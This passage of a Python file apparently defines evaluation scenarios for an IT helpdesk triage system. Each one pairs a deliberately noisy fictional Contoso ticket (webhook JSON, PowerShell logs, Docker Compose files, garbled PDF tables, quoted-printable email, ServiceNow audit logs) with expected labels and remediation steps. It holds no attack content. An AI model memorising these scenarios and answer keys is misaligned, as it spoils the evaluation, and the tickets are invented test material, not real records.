                "My dock is a Lenovo ThinkPad USB-C Dock Gen 2 and I'm running Windows 11 23H2. "
                "Is it the dock driver? Please help ASAP.\n\n"
                "- Raj Kapoor, Fixed Income Trading, Desk 7-103"
            ),
            category=Category.HARDWARE,
            priority=Priority.P2,
            team=Team.ENDPOINT,
            needs_escalation=False,
            missing_info=[MissingInfo.DEVICE_INFO, MissingInfo.ENVIRONMENT_DETAILS],
            next_best_action=(
                "Analyze the BSOD minidump pointing to Wdf01000.sys / DRIVER_POWER_STATE_FAILURE "
                "— likely a dock or USB driver issue. Prioritize because quarter-end reconciliation "
                "is impacted."
            ),
            remediation_steps=[
                "Collect the full minidump files from C:\\Windows\\Minidump on the affected laptop.",
                "Update the Lenovo ThinkPad USB-C Dock Gen 2 firmware and WDF/USB drivers.",
                "Check Windows Update history for any recently installed driver updates that correlate with the issue.",
                "If BSOD persists after driver updates, test without the dock to isolate the failure.",
                "Provide a loaner laptop if the issue cannot be resolved within 4 hours given quarter-end urgency.",
            ],
            reporter_name="Raj Kapoor",
            reporter_email="raj.kapoor@contoso.com",
            reporter_department="Fixed Income Trading",
            channel=Channel.EMAIL,
            tags=[
                "data-cleanup",
                "bsod-minidump",
                "register-state-dump",
                "kernel-bugcheck",
                "driver-power-failure",
            ],
            difficulty="medium",
        ),
        # ── DC-103  Slack/Teams webhook payload noise ────────────────────
        ScenarioDefinition(
            scenario_id="DC-103",
            subject="Teams connector integration stopped posting to Risk Alerts channel",
            description=(
                "Hi IT,\n\n"
                "Our Risk Alerts channel in Teams stopped receiving automated notifications from "
                "the webhook connector about 3 days ago. I tried to debug it and captured these "
                "webhook payloads that are failing. Can you figure out what's wrong?\n\n"
                "POST https://contoso.webhook.office.com/webhookb2/7c8d9e0f-1a2b-3c4d-5e6f-7a8b9c0d1e2f"
                "@72f988bf-86f1-41af-91ab-2d7cd011db47/IncomingWebhook/a1b2c3d4e5f6/g7h8i9j0-k1l2-"
                "m3n4-o5p6-q7r8s9t0u1v2\n"
                "Content-Type: application/json\n\n"
                '{"@type":"MessageCard","@context":"http://schema.org/extensions","themeColor":"FF0000",'
                '"summary":"Risk Threshold Breach - Portfolio ALPHA-7","sections":[{"activityTitle":'
                '"⚠️ VaR Limit Breach","activitySubtitle":"Portfolio ALPHA-7 | Desk: Macro Trading",'
                '"activityImage":"https://contoso.sharepoint.com/sites/RiskOps/icons/alert-red.png",'
                '"facts":[{"name":"Portfolio","value":"ALPHA-7"},{"name":"Current VaR","value":'
                '"$14.2M"},{"name":"VaR Limit","value":"$12.0M"},{"name":"Breach %","value":"18.3%"},'
                '{"name":"As-of Date","value":"2026-03-18"},{"name":"Risk Engine","value":'
                '"risk-calc-v3.2.1"},{"name":"Calculation Time","value":"08:15:22 UTC"}],'
                '"markdown":true}],"potentialAction":[{"@type":"OpenUri","name":"View in Risk Dashboard",'
                '"targets":[{"os":"default","uri":"https://risk.contoso.com/portfolio/ALPHA-7/var"}]},'
                '{"@type":"OpenUri","name":"Acknowledge","targets":[{"os":"default","uri":'
                '"https://risk.contoso.com/api/alerts/ack/2026-03-18/ALPHA-7"}]}]}\n\n'
                "Response: 400 Bad Request\n"
                '{"error":{"code":"WebhookUrlExpired","message":"The webhook URL has expired. '
                'Please regenerate the connector URL.","innerError":{"date":"2026-03-18T08:15:23",'
                '"request-id":"e4f5a6b7-c8d9-0e1f-2a3b-4c5d6e7f8a9b","client-request-id":'
                '"e4f5a6b7-c8d9-0e1f-2a3b-4c5d6e7f8a9b"}}}\n\n'
                "I also captured like 50 more of these payloads with different portfolio alerts "
                "(BETA-3, GAMMA-12, DELTA-9, etc.) but they all fail the same way. The webhook "
                "was working fine until March 15. We need these alerts — they're critical for "
                "real-time risk monitoring across all trading desks.\n\n"
                "Marcus Webb\nRisk Operations\nExt 4-7891"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P3,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[MissingInfo.CONFIGURATION_DETAILS, MissingInfo.TIMESTAMP],
            next_best_action=(
                "The webhook URL has expired per the 400 error response — regenerate the "
                "Teams incoming webhook connector URL and update the risk alerting system's "
                "configuration with the new endpoint."
            ),
            remediation_steps=[
                "Navigate to the Risk Alerts channel in Teams and regenerate the incoming webhook connector URL.",
                "Update the risk alerting system's webhook endpoint configuration with the new URL.",
                "Test with a sample MessageCard payload to confirm delivery.",
                "Set a calendar reminder for the next webhook expiry window to proactively rotate.",
                "Verify that queued alerts from the last 3 days are replayed or re-sent.",
            ],
            reporter_name="Marcus Webb",
            reporter_email="marcus.webb@contoso.com",
            reporter_department="Risk Operations",
            channel=Channel.EMAIL,
            tags=[
                "data-cleanup",
                "webhook-payload",
                "teams-connector",
                "messagecard-json",
                "expired-webhook-url",
            ],
            difficulty="medium",
        ),
        # ── DC-104  PowerShell mixed error/verbose/warning streams ───────
        ScenarioDefinition(
            scenario_id="DC-104",
            subject="Deploy-ContosoApp.ps1 failing on prod app servers since last Friday",
            description=(
                "The automated deployment script Deploy-ContosoApp.ps1 has been failing on all "
                "production app servers (APP-PROD-01 through APP-PROD-06) since Friday. Here's "
                "the full output I captured with -Verbose and $ErrorActionPreference = 'Continue':\n\n"
                "VERBOSE: [2026-03-15 18:30:01] Starting deployment of ContosoExpensePortal v4.7.2\n"
                "VERBOSE: [2026-03-15 18:30:01] Target servers: APP-PROD-01, APP-PROD-02, APP-PROD-03, "
                "APP-PROD-04, APP-PROD-05, APP-PROD-06\n"
                "VERBOSE: [2026-03-15 18:30:02] Connecting to APP-PROD-01 via WinRM...\n"
                "VERBOSE: [2026-03-15 18:30:03] Connected. Session ID: PSSession-7a8b9c\n"
                "VERBOSE: [2026-03-15 18:30:03] Stopping IIS Application Pool 'ContosoExpensePool'...\n"
                "VERBOSE: [2026-03-15 18:30:04] Application Pool stopped.\n"
                "VERBOSE: [2026-03-15 18:30:04] Backing up current deployment to D:\\Backups\\v4.7.1_20260315...\n"
                "VERBOSE: [2026-03-15 18:30:08] Backup complete. 847 files copied.\n"
                "VERBOSE: [2026-03-15 18:30:08] Extracting package ContosoExpensePortal.4.7.2.nupkg...\n"
                "VERBOSE: [2026-03-15 18:30:12] Extraction complete. Applying transforms for PROD environment...\n"
                "WARNING: [2026-03-15 18:30:12] Config transform: ConnectionStrings.config — key "
                "'ReportingDB' not found in transform file. Using base value.\n"
                "WARNING: [2026-03-15 18:30:12] Config transform: AppSettings.config — key "
                "'FeatureFlag.NewDashboard' not found in transform file. Using base value.\n"
                "VERBOSE: [2026-03-15 18:30:13] Transforms applied. Starting file deployment...\n"
                "VERBOSE: [2026-03-15 18:30:15] Deployed 312/847 files...\n"
                "VERBOSE: [2026-03-15 18:30:17] Deployed 624/847 files...\n"
                "VERBOSE: [2026-03-15 18:30:19] Deployed 847/847 files.\n"
                "VERBOSE: [2026-03-15 18:30:19] Running post-deploy health check...\n"
                "Write-Error: [2026-03-15 18:30:22] Health check FAILED on APP-PROD-01.\n"
                "Write-Error: HTTP GET https://app-prod-01.contoso.local/health returned 503\n"
                'Write-Error: Response body: {"status":"unhealthy","checks":{"database":{"status":'
                '"degraded","description":"Connection timeout after 30s"},"redis":{"status":'
                '"healthy"},"blobStorage":{"status":"healthy"}}}\n'
                "WARNING: [2026-03-15 18:30:22] Rolling back APP-PROD-01 to v4.7.1...\n"
                "VERBOSE: [2026-03-15 18:30:28] Rollback complete on APP-PROD-01.\n"
                "Write-Error: [2026-03-15 18:30:28] Deployment FAILED. 0 of 6 servers updated.\n"
                "Write-Error: Reason: Health check failure — database connection timeout.\n\n"
                "I ran the same script last Thursday for v4.7.1 and it worked perfectly. Something "
                "changed with the database or network over the weekend. Can you check?\n\n"
                "- Naomi Okafor, DevOps Engineering"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P2,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[MissingInfo.ERROR_MESSAGE, MissingInfo.ENVIRONMENT_DETAILS],
            next_best_action=(
                "The deployment health check reveals a database connection timeout — investigate "
                "the production database server connectivity from the app tier rather than the "
                "deployment script itself."
            ),
            remediation_steps=[
                "Check the production database server for connectivity issues or recent configuration changes.",
                "Verify firewall rules between the app tier and database tier haven't been modified.",
                "Test direct SQL connectivity from APP-PROD-01 to the ReportingDB instance.",
                "Review any weekend maintenance or patching that may have affected the database.",
                "Once database connectivity is restored, re-run Deploy-ContosoApp.ps1 for v4.7.2.",
            ],
            reporter_name="Naomi Okafor",
            reporter_email="naomi.okafor@contoso.com",
            reporter_department="DevOps Engineering",
            channel=Channel.CHAT,
            tags=[
                "data-cleanup",
                "powershell-streams",
                "verbose-error-interleave",
                "deployment-health-check",
                "iis-rollback",
            ],
            difficulty="medium",
        ),
        # ── DC-105  Docker Compose YAML flood ────────────────────────────
        ScenarioDefinition(
            scenario_id="DC-105",
            subject="Containerized reconciliation app won't start after infra migration",
            description=(
                "Hi team,\n\n"
                "Since the infrastructure team migrated us to the new Docker hosts last week, "
                "our Trade Reconciliation app won't start. I've attached all three of our "
                "docker-compose files below. Can someone tell me what's wrong?\n\n"
                "=== docker-compose.yml (base) ===\n"
                "version: '3.8'\n"
                "services:\n"
                "  recon-api:\n"
                "    image: contosoacr.azurecr.io/trade-recon-api:4.1.0\n"
                "    ports:\n"
                "      - '8080:8080'\n"
                "    environment:\n"
                "      - ASPNETCORE_ENVIRONMENT=Production\n"
                "      - ConnectionStrings__ReconDB=Server=sqlprod-03.contoso.local;Database=TradeRecon;"
                "Trusted_Connection=true\n"
                "      - Redis__Endpoint=redis-cluster.contoso.local:6379\n"
                "      - Kafka__BootstrapServers=kafka-01.contoso.local:9092,kafka-02.contoso.local:9092\n"
                "    depends_on:\n"
                "      - recon-worker\n"
                "      - redis\n"
                "    networks:\n"
                "      - recon-net\n"
                "    deploy:\n"
                "      resources:\n"
                "        limits:\n"
                "          memory: 2G\n"
                "          cpus: '1.0'\n"
                "    healthcheck:\n"
                "      test: ['CMD', 'curl', '-f', 'http://localhost:8080/health']\n"
                "      interval: 30s\n"
                "      timeout: 10s\n"
                "      retries: 3\n\n"
                "  recon-worker:\n"
                "    image: contosoacr.azurecr.io/trade-recon-worker:4.1.0\n"
                "    environment:\n"
                "      - WORKER_CONCURRENCY=8\n"
                "      - ConnectionStrings__ReconDB=Server=sqlprod-03.contoso.local;Database=TradeRecon;"
                "Trusted_Connection=true\n"
                "      - Kafka__BootstrapServers=kafka-01.contoso.local:9092,kafka-02.contoso.local:9092\n"
                "      - Kafka__ConsumerGroup=recon-worker-prod\n"
                "    networks:\n"
                "      - recon-net\n"
                "    deploy:\n"
                "      replicas: 3\n"
                "      resources:\n"
                "        limits:\n"
                "          memory: 4G\n"
                "          cpus: '2.0'\n\n"
                "  redis:\n"
                "    image: redis:7.2-alpine\n"
                "    ports:\n"
                "      - '6379:6379'\n"
                "    volumes:\n"
                "      - redis-data:/data\n"
                "    networks:\n"
                "      - recon-net\n\n"
                "volumes:\n"
                "  redis-data:\n\n"
                "networks:\n"
                "  recon-net:\n"
                "    driver: bridge\n\n"
                "=== docker-compose.override.yml ===\n"
                "version: '3.8'\n"
                "services:\n"
                "  recon-api:\n"
                "    ports:\n"
                "      - '8443:8443'\n"
                "    environment:\n"
                "      - ASPNETCORE_URLS=https://+:8443;http://+:8080\n"
                "      - ASPNETCORE_Kestrel__Certificates__Default__Path=/certs/contoso-recon.pfx\n"
                "      - ASPNETCORE_Kestrel__Certificates__Default__Password=${CERT_PASSWORD}\n"
                "    volumes:\n"
                "      - /etc/contoso/certs:/certs:ro\n\n"
                "=== docker-compose.monitoring.yml ===\n"
                "version: '3.8'\n"
                "services:\n"
                "  prometheus:\n"
                "    image: prom/prometheus:v2.51.0\n"
                "    volumes:\n"
                "      - ./prometheus.yml:/etc/prometheus/prometheus.yml\n"
                "    ports:\n"
                "      - '9090:9090'\n"
                "    networks:\n"
                "      - recon-net\n\n"
                "The error when I run docker compose up is:\n"
                "Error response from daemon: pull access denied for contosoacr.azurecr.io/"
                "trade-recon-api, repository does not exist or may require 'docker login'\n\n"
                "The images definitely exist in our ACR — I can see them in the Azure portal. "
                "I think the new Docker hosts aren't authenticated to our container registry.\n\n"
                "This is blocking the entire Trade Ops team from running end-of-day reconciliation.\n\n"
                "Kevin Nguyen\nTrade Operations Technology\nExt 3-2198"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P2,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[MissingInfo.ENVIRONMENT_DETAILS, MissingInfo.CONFIGURATION_DETAILS],
            next_best_action=(
                "The Docker error indicates the new hosts lack ACR authentication — configure "
                "docker login or managed identity credentials for contosoacr.azurecr.io on the "
                "migrated Docker hosts."
            ),
            remediation_steps=[
                "Run 'az acr login --name contosoacr' or configure a service principal "
                "for ACR pull access on each new host.",
                "Verify the managed identity or service principal has AcrPull role on the contosoacr registry.",
                "Test pulling the image manually: docker pull contosoacr.azurecr.io/trade-recon-api:4.1.0.",
                "Once authenticated, re-run docker compose up and verify all services start healthy.",
                "Document the ACR authentication step in the infrastructure migration runbook for future hosts.",
            ],
            reporter_name="Kevin Nguyen",
            reporter_email="kevin.nguyen@contoso.com",
            reporter_department="Trade Operations Technology",
            channel=Channel.CHAT,
            tags=[
                "data-cleanup",
                "docker-compose-flood",
                "yaml-config-dump",
                "acr-authentication",
                "container-registry-pull",
            ],
            difficulty="medium",
        ),
        # ── DC-106  PDF OCR with table misalignment and number corruption ─
        ScenarioDefinition(
            scenario_id="DC-106",
            subject="Report generation app producing garbled PDF output for quarterly NAV reports",
            description=(
                "The ContosoReportEngine application is producing corrupted PDF output when "
                "generating quarterly NAV (Net Asset Value) reports. When I try to copy-paste "
                "the table data from the PDF, this is what I get — the columns are completely "
                "misaligned and the numbers are garbled:\n\n"
                "CONTOSO FINANCIAL SERVICES — Q1 2026 NAV REPORT\n"
                "Fund Name                NAV/Share    AUM ($M)     YTD Return   Sharpe   Benchmark\n"
                "Contoso Growth Eq        $142.87      3,2l7.4      +8.37%       1.42     S&P 500\n"
                "Contoso Fixed Inc                     $98.23       1,876.O      +2.91%            0.87     "
                "BBG Agg\n"
                "Contoso Balanced    $ll5.6O           2,O43.8      +5.12%                1.15     60/40 Blend\n"
                "Contoso Em Mkt Eq   $67.34                         897.2        +12.4l%  1.03     MSCI EM\n"
                "Contoso Real Asset       $83.9l       654.3                     +3.78%   0.92     "
                "CPI+3%\n"
                "Contoso HY Credit        $lO1.22      1,1O9.7      +6.54%       1.28     ICE HY\n"
                "Contoso Quant Alph  $178.45      4,567.l      +15.23%      1.89     HFRX\n"
                "Contoso Pvt Credit       $95.OO       2,334.6      +7.8O%       1.34     "
                "CDLI\n\n"
                "                    TOTAL AUM:   $l6,72O.l M\n\n"
                "PERFORMANCE ATTRIBUTION (Contoso Growth Equity)\n"
                "Sector               Weight    Contrib    S&P Wt    Active     Selection\n"
                "Technology            28.3%     +3.2l%     3l.7%     -3.4%      +O.87%\n"
                "Healthcare            l5.7%     +l.O3%     l2.4%     +3.3%      +O.42%\n"
                "Financials            l8.2%     +l.56%     l3.l%     +5.l%      +O.3l%\n"
                "Consumer Disc         l2.l%     +O.98%     lO.5%     +l.6%      +O.22%\n"
                "lndustrials            9.4%     +O.7l%      8.7%     +O.7%      +O.l8%\n"
                "Energy                 6.8%     +O.43%      3.9%     +2.9%      -O.O5%\n"
                "Other                  9.5%     +O.45%     l9.7%    -lO.2%      -O.l2%\n"
                "TOTAL               lOO.O%     +8.37%    lOO.O%      O.O%      +l.83%\n\n"
                "As you can see, zeros are showing as capital O, ones and lowercase L are confused, "
                "columns bleed into each other, and some cells shifted rows. The raw data in our "
                "database is correct — I've verified that. The problem is the PDF rendering engine. "
                "This started after the ContosoReportEngine was upgraded to v3.5.0 last Tuesday.\n\n"
                "This is blocking our quarterly client reporting — we have 230+ institutional "
                "clients waiting for these reports.\n\n"
                "Diane Kowalski\nClient Reporting, Portfolio Analytics\nExt 5-3344"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P3,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[MissingInfo.APPLICATION_VERSION, MissingInfo.ERROR_MESSAGE],
            next_best_action=(
                "The OCR-like corruption (O/0 and l/1 confusion, column misalignment) started "
                "after ContosoReportEngine v3.5.0 upgrade — investigate the PDF rendering library "
                "change in that version."
            ),
            remediation_steps=[
                "Compare ContosoReportEngine v3.5.0 release notes for changes to the PDF rendering library.",
                "Test rolling back to v3.4.x to confirm the regression.",
                "Check if font embedding settings changed — O/0 and l/1 confusion suggests a font substitution issue.",
                "Generate a test NAV report and compare PDF text extraction output against the database source.",
                "If v3.5.0 font rendering is confirmed buggy, deploy v3.4.x as hotfix while the vendor investigates.",
            ],
            reporter_name="Diane Kowalski",
            reporter_email="diane.kowalski@contoso.com",
            reporter_department="Client Reporting",
            channel=Channel.PORTAL,
            tags=[
                "data-cleanup",
                "ocr-number-corruption",
                "table-column-misalignment",
                "pdf-rendering-regression",
                "font-substitution-artifact",
            ],
            difficulty="hard",
        ),
        # ── DC-107  Quoted-printable email encoding artifacts ────────────
        ScenarioDefinition(
            scenario_id="DC-107",
            subject="SSO login failing for Contoso Trade Portal - getting infinite redirect loop",
            description=(
                "Hi IT Support,\n\n"
                "I can=E2=80=99t log into the Contoso Trade Portal (https://trade.contoso.c=\n"
                "om/portal) since this morning. It just keeps redirecting me in a loop and =\n"
                "eventually shows =E2=80=9CThis page isn=E2=80=99t working =E2=80=94 trade.contoso.com =\n"
                "redirected you too many times.=E2=80=9D\n\n"
                "I=E2=80=99ve tried the following:\n"
                "=E2=80=A2 Cleared all cookies and cache in Edge and Chrome\n"
                "=E2=80=A2 Tried InPrivate/Incognito browsing =E2=80=94 same result\n"
                "=E2=80=A2 Asked my colleague David (david.park@contoso.com) =E2=80=94 he ca=\n"
                "n log in fine\n"
                "=E2=80=A2 Tried from my phone on cellular (not VPN) =E2=80=94 still fails\n"
                "=E2=80=A2 Checked https://myaccount.microsoft.com =E2=80=94 my account looks=\n"
                " fine there\n\n"
                "The URL it keeps bouncing between is:\n"
                "https://login.microsoftonline.com/72f988bf-86f1-41af-91ab-2d7cd011db47/o=\n"
                "auth2/v2.0/authorize?client_id=3Da8c7e4f2-91b5-4d3a-b6c8-f0e2d4a6b8c0&r=\n"
                "edirect_uri=3Dhttps%3A%2F%2Ftrade.contoso.com%2F.auth%2Flogin%2Faad%2Fcal=\n"
                "lback&response_type=3Dcode&scope=3Dopenid%20profile%20email&state=3DeyJub=\n"
                "25jZSI6IjVhNGIzYzJkMWU2ZiJ9\n\n"
                "And then it redirects to:\n"
                "https://trade.contoso.com/.auth/login/aad/callback?code=3D0.AYIA-4j5cv=\n"
                "GBr0GRqy180BHbR_LE...\n\n"
                "This is=20really urgent =E2=80=94 I have 47 pending trade confirmations that =\n"
                "need to be approved by 4 PM ET today. If I miss the cutoff the trades go =\n"
                "to exception processing which costs the firm $2,300 per ticket.\n\n"
                "Can someone look at my Azure AD / SSO configuration? Maybe my conditional=\n"
                " access policy changed?\n\n"
                "Thanks,\n"
                "Elena Vasquez\n"
                "Trade Confirmation Analyst\n"
                "Capital Markets Operations\n"
                "Ext 6-2847=20\n"
            ),
            category=Category.ACCESS_AUTH,
            priority=Priority.P2,
            team=Team.IAM,
            needs_escalation=False,
            missing_info=[MissingInfo.AUTHENTICATION_METHOD, MissingInfo.ERROR_MESSAGE],
            next_best_action=(
                "Investigate the SSO redirect loop for the Contoso Trade Portal — likely "
                "a conditional access policy or token caching issue specific to this user's "
                "Azure AD session."
            ),
            remediation_steps=[
                "Check the user's Azure AD sign-in logs for error codes during the redirect loop.",
                "Review conditional access policies applied to the Trade Portal app registration.",
                "Revoke the user's refresh tokens (Revoke-AzureADUserAllRefreshToken) and have them re-authenticate.",
                "Verify the app registration redirect URIs match the current Trade Portal deployment URL.",
                "If the issue is policy-related, grant a temporary exclusion so the user "
                "can process the 47 pending trade confirmations.",
            ],
            reporter_name="Elena Vasquez",
            reporter_email="elena.vasquez@contoso.com",
            reporter_department="Capital Markets Operations",
            channel=Channel.EMAIL,
            tags=[
                "data-cleanup",
                "quoted-printable-encoding",
                "soft-line-breaks",
                "sso-redirect-loop",
                "content-transfer-encoding",
            ],
            difficulty="hard",
        ),
        # ── DC-108  ServiceNow audit trail flood ─────────────────────────
        ScenarioDefinition(
            scenario_id="DC-108",
            subject="FW: INC0048721 - VPN access request for new Hong Kong office employees",
            description=(
                "---------- Forwarded message ----------\n"
                "From: ServiceNow Notifications <servicenow-noreply@contoso.com>\n"
                "To: it-helpdesk@contoso.com\n"
                "Subject: INC0048721 - State changed to: Awaiting Assignment\n\n"
                "=== INCIDENT RECORD: INC0048721 ===\n"
                "Short description: VPN access for HK office new hires\n"
                "State: Awaiting Assignment\n"
                "Priority: 3 - Moderate\n"
                "Category: Network\n"
                "Assigned to: (empty)\n"
                "Assignment group: Network Operations\n\n"
                "=== FULL ACTIVITY LOG ===\n\n"
                "[2026-03-01 09:15:22 HKT] Incident created by: jennifer.wong@contoso.com\n"
                "  Field changes:\n"
                "    Short description: (empty) → 'VPN access for HK office new hires'\n"
                "    Description: (empty) → 'We have 12 new employees starting in the Hong Kong "
                "office on March 15 who need GlobalProtect VPN access to the NYC trading systems. "
                "Employee IDs: HK-2026-001 through HK-2026-012.'\n"
                "    Category: (empty) → Network\n"
                "    Subcategory: (empty) → VPN\n"
                "    Priority: (empty) → 3 - Moderate\n"
                "    Contact type: (empty) → Email\n"
                "    Caller: (empty) → Jennifer Wong\n\n"
                "[2026-03-01 09:15:23 HKT] Auto-assignment rule triggered\n"
                "  Rule: 'Network category → Network Operations'\n"
                "  Field changes:\n"
                "    Assignment group: (empty) → Network Operations\n"
                "    State: New → Awaiting Assignment\n\n"
                "[2026-03-01 10:30:45 HKT] Approval requested\n"
                "  Approval for: VPN access — 12 users\n"
                "  Approver: michael.burke@contoso.com (HK Office Manager)\n"
                "  State: Requested\n\n"
                "[2026-03-01 14:22:11 HKT] Approval record updated\n"
                "  Approver: michael.burke@contoso.com\n"
                "  State: Requested → Approved\n"
                "  Comments: 'Approved. All 12 are confirmed new hires starting 3/15.'\n\n"
                "[2026-03-02 08:45:33 HKT] Work note added by: network-ops-bot@contoso.com\n"
                "  'Auto-check: GlobalProtect license count = 4,847/5,000. Sufficient capacity "
                "for 12 additional users.'\n\n"
                "[2026-03-02 09:12:44 HKT] Field changes by: system\n"
                "    SLA: (empty) → 'P3 Resolution - 5 business days'\n"
                "    SLA breach time: (empty) → 2026-03-08 09:15:22 HKT\n\n"
                "[2026-03-05 11:33:22 HKT] Work note added by: amit.sharma@contoso.com\n"
                "  'Created GP user groups HK-OFFICE-VPN-2026Q1. Waiting on AD account creation "
                "for the 12 new hires before we can add them. Pinged IAM team.'\n\n"
                "[2026-03-07 16:45:00 HKT] SLA warning notification sent\n"
                "  'SLA breach in 1 business day for INC0048721'\n"
                "  Notified: network-ops-leads@contoso.com\n\n"
                "[2026-03-08 09:15:22 HKT] SLA BREACHED\n"
                "  Field changes:\n"
                "    SLA status: In Progress → Breached\n"
                "    Escalation: Normal → High\n\n"
                "[2026-03-10 08:00:15 HKT] Work note added by: jennifer.wong@contoso.com\n"
                "  'The new hires start in 5 days! Their AD accounts were created on 3/8. "
                "Can someone please add them to the VPN group?'\n\n"
                "[2026-03-12 14:22:33 HKT] Assignment changed by: amit.sharma@contoso.com\n"
                "  Field changes:\n"
                "    Assigned to: (empty) → Amit Sharma\n"
                "    State: Awaiting Assignment → In Progress\n\n"
                "[2026-03-12 14:30:00 HKT] Work note added by: amit.sharma@contoso.com\n"
                "  'Adding HK-2026-001 through HK-2026-012 to HK-OFFICE-VPN-2026Q1 group now. "
                "Need to also configure split-tunnel for HK→NYC traffic.'\n\n"
                "[2026-03-14 09:00:00 HKT] Field changes by: amit.sharma@contoso.com\n"
                "    State: In Progress → Pending\n"
                "    Pending reason: Awaiting vendor\n"
                "  Work note: 'Split-tunnel config requires Palo Alto TAC case. Opened case #TA-887432.'\n\n"
                "[2026-03-15 07:30:00 HKT] Comment added by: jennifer.wong@contoso.com\n"
                "  'The new hires are starting TODAY and they still cannot connect to VPN! "
                "This was submitted 2 weeks ago. Please escalate.'\n\n"
                "[2026-03-15 07:31:12 HKT] State changed by: system (escalation rule)\n"
                "  Field changes:\n"
                "    Priority: 3 - Moderate → 2 - High\n"
                "    State: Pending → Awaiting Assignment\n"
                "    Assigned to: Amit Sharma → (empty)\n"
                "    Assignment group: Network Operations → Network Operations (re-queued)\n\n"
                "=== END ACTIVITY LOG ===\n\n"
                "Can someone PLEASE just give these 12 people VPN access? They started today "
                "and can't do anything. — Jennifer"
            ),
            category=Category.NETWORK,
            priority=Priority.P3,
            team=Team.NETWORK_OPS,
            needs_escalation=False,
            missing_info=[MissingInfo.AFFECTED_USERS, MissingInfo.NETWORK_LOCATION],
            next_best_action=(
                "Cut through the ServiceNow audit trail — the core request is simple: add 12 "
                "HK new-hire AD accounts (HK-2026-001 through HK-2026-012) to the "
                "HK-OFFICE-VPN-2026Q1 GlobalProtect group and configure split-tunnel for HK→NYC."
            ),
            remediation_steps=[
                "Add AD accounts HK-2026-001 through HK-2026-012 to the "
                "HK-OFFICE-VPN-2026Q1 security group immediately.",
                "Verify GlobalProtect portal configuration includes the "
                "HK-OFFICE-VPN-2026Q1 group in the allowed access policy.",
                "Follow up on Palo Alto TAC case #TA-887432 for the split-tunnel configuration.",
                "Have one new hire test VPN connectivity from the HK office to confirm access to NYC trading systems.",
                "Update INC0048721 and close once all 12 users have confirmed working VPN access.",
            ],
            reporter_name="Jennifer Wong",
            reporter_email="jennifer.wong@contoso.com",
            reporter_department="Hong Kong Office Operations",
            channel=Channel.EMAIL,
            tags=[
                "data-cleanup",
                "servicenow-audit-trail",
                "state-transition-history",
                "sla-breach-noise",
                "approval-chain-dump",
            ],
            difficulty="medium",
        ),
        # ── DC-109  Bloomberg terminal paste with fixed-width noise ──────
        ScenarioDefinition(
            scenario_id="DC-109",
            subject="CRITICAL - Bloomberg terminal not connecting - entire trading floor affected",
            description=(
                "BLOOMBERG IS DOWN. I've been trying to troubleshoot and I'm getting this on my "
                "terminal screen. Pasting everything I can see:\n\n"
                "B-PIPE CONNECTION STATUS\n"
                "========================\n"
                "Host: ny-bbg-feed-01.contoso.local    Port: 8194    Status: DISCONNECTED\n"
                "Host: ny-bbg-feed-02.contoso.local    Port: 8194    Status: DISCONNECTED\n"
                "Host: ny-bbg-feed-03.contoso.local    Port: 8194    Status: TIMEOUT (30s)\n"
                "Last successful heartbeat: 2026-03-18T07:42:11.003Z (48 min ago)\n"
                "Reconnect attempts: 147 (all failed)\n"
                "Error: E_CONNECTION_REFUSED | BLPAPI SessionOptions timeout\n\n"
                "Last good data snapshot before disconnect:\n"
                "TICKER          BID       ASK       LAST      VOLUME     CHG     CHG%\n"
                "-----------------------------------------------------------------------\n"
                "SPX Index       5,847.23  5,847.89  5,847.56  1.2B       +23.45  +0.40%\n"
                "INDU Index     43,892.10 43,895.40 43,893.75  342M       +112.30 +0.26%\n"
                "CCMP Index     18,234.67 18,236.12 18,235.40  4.8B       +89.23  +0.49%\n"
                "US10YT=RR       4.2340    4.2355    4.2348    98.2B      -0.0120 -0.28%\n"
                "EUR Curncy      1.0892    1.0894    1.0893    187B       +0.0023 +0.21%\n"
                "JPY Curncy    149.8700  149.8900  149.8800    245B       -0.2300 -0.15%\n"
                "CL1 Comdty     78.34     78.37     78.35     412K       +1.23   +1.60%\n"
                "GC1 Comdty   2,178.40  2,178.90  2,178.65    198K       +12.40  +0.57%\n"
                "VIX Index       14.23     14.45     14.34     n/a        -0.67   -4.48%\n\n"
                "BLPAPI DIAGNOSTICS:\n"
                "  Session pool: 0/24 active (all sessions closed by remote)\n"
                "  Subscription count: 12,847 (all stale)\n"
                "  Last event type: SESSION_STATUS / SESSION_TERMINATED\n"
                "  TCP state to ny-bbg-feed-01: SYN_SENT (no ACK received)\n"
                "  TCP state to ny-bbg-feed-02: SYN_SENT (no ACK received)\n"
                "  TCP state to ny-bbg-feed-03: CLOSED (RST received)\n"
                "  Network path MTU: 1500 (no fragmentation)\n"
                "  DNS resolution: ny-bbg-feed-01 → 10.60.1.101 (OK)\n"
                "  DNS resolution: ny-bbg-feed-02 → 10.60.1.102 (OK)\n"
                "  DNS resolution: ny-bbg-feed-03 → 10.60.1.103 (OK)\n"
                "  Firewall rule check: UNKNOWN (cannot reach policy server)\n\n"
                "We have 34 portfolio managers and 22 traders on this floor who are completely "
                "blind right now. Market opened 30 minutes ago. Every minute we are down costs "
                "us real money — we can't see prices, can't execute, can't hedge. The backup "
                "Reuters feed is on a different system that only 3 people have access to.\n\n"
                "Please treat this as the highest possible priority.\n\n"
                "George Papadopoulos\nHead of Equity Trading Desk\nFloor 12, NYC\nDirect: 212-555-0147"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P1,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=True,
            missing_info=[MissingInfo.NETWORK_LOCATION, MissingInfo.ENVIRONMENT_DETAILS],
            next_best_action=(
                "Critical Bloomberg B-PIPE outage affecting entire trading floor — all three feed "
                "servers are unreachable (SYN_SENT / RST). Investigate network path from trading "
                "floor VLAN to Bloomberg feed servers on 10.60.1.x and check firewall rules."
            ),
            remediation_steps=[
                "Verify network connectivity from the trading floor VLAN to the "
                "Bloomberg feed servers (10.60.1.101-103) on port 8194.",
                "Check the firewall rules — the BLPAPI diagnostic says it cannot "
                "reach the policy server, suggesting a firewall change.",
                "Contact Bloomberg support with the B-PIPE connection error details if the network path is clear.",
                "As an interim measure, expand access to the backup Reuters feed for more traders.",
